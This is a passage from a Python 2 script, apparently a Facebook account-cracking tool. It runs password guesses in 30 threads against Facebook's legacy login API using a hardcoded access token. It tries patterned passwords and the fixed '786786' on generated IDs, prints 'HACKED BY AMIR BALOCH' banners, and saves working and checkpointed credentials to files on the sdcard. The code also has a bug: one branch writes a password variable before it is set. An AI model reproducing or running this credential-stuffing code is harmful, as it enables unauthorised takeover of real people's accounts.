try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m iD iz OK [HACKED BY AMIR BALOCI]   \xe2\x97\x8f  \x1b[1;92m' + k + c + user + '\x1b[1;92m \xe2\x97\x8f \x1b[1;92m' + pass1
                okb = open('sdcard/ABcloned/OK.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m iD iZ CP [ OpeN After 8 DayZ ]\x1b[1;91m \xe2\x97\x8f \x1b[1;91m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;91m ' + pass1
                cps = open('sdcard/ABcloned/CP.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + c + user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m iD iz OK [HACKED BY AMIR BALOCH]   \xe2\x97\x8f  \x1b[1;92m' + k + c + user + '\x1b[1;92m \xe2\x97\x8f \x1b[1;92m' + pass2
                    okb = open('sdcard/ABcloned/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m iD iZ CP [ OpeN After 8 DayZ ]\x1b[1;91m \xe2\x97\x8f \x1b[1;91m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;91m ' + pass2
                    cps = open('sdcard/ABcloned/CP.txt', 'a')
                    cps.write(k + c + user + pass3 + '\n')
                    cps.close()
                    cpb.append(c + user + pass3)
                else:
                    pass3 = '786786'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m iD iz OK [HACKED BY AMIR BALOCH]   \xe2\x97\x8f  \x1b[1;92m' + k + c + user + '\x1b[1;92m \xe2\x97\x8f \x1b[1;92m' + pass3
                        okb = open('sdcard/ABcloned/OK.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m iD iZ CP [ OpeN After 8 DayZ ]\x1b[1;91m \xe2\x97\x8f \x1b[1;91m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;91m ' + pass3
                        cps = open('sdcard/ABcloned/CP.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;91m-'
    print 'Process Has Been Completed ...'
    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
    login()





if __name__ == '__main__':
    login()
